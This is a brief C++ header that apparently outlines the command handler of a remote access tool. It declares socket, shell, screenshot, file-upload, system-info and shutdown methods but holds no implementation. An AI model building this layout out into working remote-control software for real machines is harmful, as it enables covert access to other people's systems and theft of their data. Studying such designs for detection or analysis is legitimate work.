#pragma once
#include "StartSocket.h"
#include "Shell.h"
#include "GetSystemInfo.h"
#include "Screenshot.h"
#include "FileUpload.h"

#include <Windows.h>
#include <vector>
#include <thread>



#pragma comment (lib, "Ws2_32.lib")


class Command {
public:
	Command();

private:
	bool bScreenShot();
	bool bFileUpload();
	bool bShell();
	bool bGetVersion();
	bool bShutDown();
	bool bDefault(char* command);
};
